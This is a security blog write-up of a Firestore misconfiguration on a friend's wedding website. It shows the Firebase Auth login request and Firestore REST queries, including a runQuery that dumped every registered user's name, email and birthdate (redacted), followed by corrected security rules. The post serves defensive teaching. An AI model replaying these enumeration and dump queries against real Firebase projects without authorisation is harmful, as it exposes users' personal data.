---
layout: post
title: "Wedding Website using Google APIs — Firestore Misconfiguration"
date: 2025-08-01
category: web
tags: [firebase, firestore, misconfiguration, idor, google-cloud]
severity: high
excerpt: "A friend's wedding website leaned on Firebase for auth and storage. Proper auth — but improperly scoped Firestore rules let any logged-in user dump every registered user's PII via the REST API."
---

# Wedding Website using Google APIs — Firestore Misconfiguration

## The research goal

A friend of mine built a wedding website, and I offered to sanity-check its security before the big day. The stack was attractive and dangerous at the same time: a fully **Google-API-driven** frontend — Firebase Authentication for identity, Firestore for storage. High-quality infrastructure, but infrastructure is only as good as its rules.

## Reconnaissance — mapping the request surface

The website itself was well written. Nearly every request routed through Google's APIs, so the attack surface collapsed nicely into a small set of well-known endpoints. Given how much logic was delegated to Firebase, the natural question became: **what can an authenticated client do against the Firestore data plane?**

### Authentication flow

Login uses Firebase Auth's standard REST endpoint (API key exposed client-side, which is normal for Firebase Web):

```text
POST identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={{key}}

{
  "returnSecureToken": true,
  "email": "homigrotas@some.mail",
  "password": "testtest",
  "clientType": "CLIENT_TYPE_WEB"
}
```

Response for invalid credentials:

```json
{
	"error": {
		"code": 400,
		"message": "INVALID_LOGIN_CREDENTIALS",
		"errors": [
			{
				"message": "INVALID_LOGIN_CREDENTIALS",
				"domain": "global",
				"reason": "invalid"
			}
		]
	}
}
```

Nothing remarkable here — the auth layer behaves exactly as documented.

## Quick intro: what is Firestore?

Firestore is Google's **NoSQL document database** in Firebase. It's fast, flexible, and scales automatically — *if* it's configured properly. The critical detail for a security assessment is that Firestore trusts its **security rules** to answer every read and write. Those rules are the *only* boundary between an authenticated client and the data. Get them wrong, and "any authenticated user" becomes "any authenticated user with full database access."

## Researching the app's Firestore

After registering and logging in, I noticed an API call I don't usually see on web apps:

```text
POST https://firestore.googleapis.com/v1/projects/{{project_id}}/databases/(default)/documents:runAggregationQuery
```

Aggregation queries are a legitimate feature — the site was counting chat messages with them. But their presence is a hint about what the client can legally do against the database.

### Step 1 — Enumerate collections

My first instinct: list every collection in the project:

```text
POST https://firestore.googleapis.com/v1/projects/{{project_id}}/databases/(default)/documents:listCollectionIds
```

Response:

```json
{
  "error": {
    "code": 403,
    "message": "Missing or insufficient permissions.",
    "status": "PERMISSION_DENIED"
  }
}
```

Denied. The rules aren't wide open at the project level — someone configured them with care. But `listCollectionIds` is a coarse, all-or-nothing endpoint. The real question was whether **specific collections** had narrower (and weaker) rules.

### Step 2 — Probe a known collection

I knew the app used an `eventChats` collection, so I queried it directly through the aggregation endpoint the app itself used:

```text
POST https://firestore.googleapis.com/v1/projects/{{project_id}}/databases/(default)/documents:runAggregationQuery

{
  "structuredAggregationQuery": {
    "aggregations": [
      {
        "alias": "aggregate_0",
        "count": {}
      }
    ],
    "structuredQuery": {
      "from": [
        {
          "collectionId": "eventChats"
        }
      ]
    }
  }
}
```

Response:

```json
[{
  "result": {
    "aggregateFields": {
      "aggregate_0": {
        "integerValue": "0"
      }
    }
  },
  "readTime": "2025-08-01T15:34:01.251261Z"
}]
```

Interesting — the query executed **without permission errors**. That means `eventChats` is readable by any authenticated user. The docs endpoint I based this on is the `runQuery` reference for the Firestore REST API, and it allowed me to enumerate collection names by brute-forcing plausible ones.

### Step 3 — Dump the `users` collection

Chats being readable was low-impact. The site must also store its **users** — and user records are exactly what a wedding site should never leak. One more guess:

```text
POST https://firestore.googleapis.com/v1/projects/{{project_id}}/databases/(default)/documents:runQuery

{
  "structuredQuery": {
    "from": [{ "collectionId": "users" }]
  }
}
```

And that was it — every registered user, in full:

```json
[{
  "document": {
    "name": "projects/{{project_id}}/databases/(default)/documents/users/0vg....",
    "fields": {
      "firebaseUid": { "stringValue": "0vg...." },
      "name": { "stringValue": "...." },
      "email": { "stringValue": "...@gmail.com" },
      "profileImageUrl": { "stringValue": "..." },
      "birthday": { "stringValue": "1998-08-17" },
      "createdAt": { "timestampValue": "2025-07-21T16:44:44.075Z" },
      "updatedAt": { "timestampValue": "2025-07-21T16:44:44.075Z" }
    },
    "createTime": "2025-07-21T16:44:44.123596Z",
    "updateTime": "2025-07-21T16:44:44.123596Z"
  },
  "readTime": "2025-08-01T14:16:16.474399Z"
},
    ....
]
```

Full names, email addresses, birthdates, profile images — the complete guest list of the wedding, plus anyone else who registered, exfiltrated in a single authenticated request.

## Root cause analysis

The developers chose **Firebase Authentication** for identity — a solid choice — but never enforced matching **Firestore security rules**. The result:

- The **authentication boundary** was correctly configured: only registered users could reach the database.
- The **authorization boundary** was missing: once inside, *any* authenticated user could read every collection, including `users`.

This is the classic "authenticated but not authorized" gap. It's an authorization issue (broken access control), not an authentication issue.

## Fixing it — least-privilege Firestore rules

Firestore rules should be scoped per-collection, per-document, and ideally per-field. A corrected ruleset for this app:

```js
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Only allow users to read/write their own document
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    // For eventChats, allow only logged-in users to read, or limit further
    match /eventChats/{chatId} {
      allow read: if request.auth != null;
      allow write: if false; // or restrict to specific roles
    }
  }
}
```

The principles behind the fix:

1. **Deny by default** — no rule, no access.
2. **Scope reads to the actor** — a user should only see `users/{their-own-uid}`.
3. **Narrow writes even further** — guests don't need to write chat history.

## Final thoughts

When I saw Firebase in the stack, I assumed the platform's defaults would protect the data. The infrastructure was solid — the *configuration* was the vulnerability.

The moral of the story? **Tools don't make your app secure — you do.** The cloud vendor gives you the primitives; the security model is still on you. Test like an attacker, and think like a developer: assume *somebody* will be authenticated, and ask whether they can see more than they're supposed to.

Have fun exploring :)
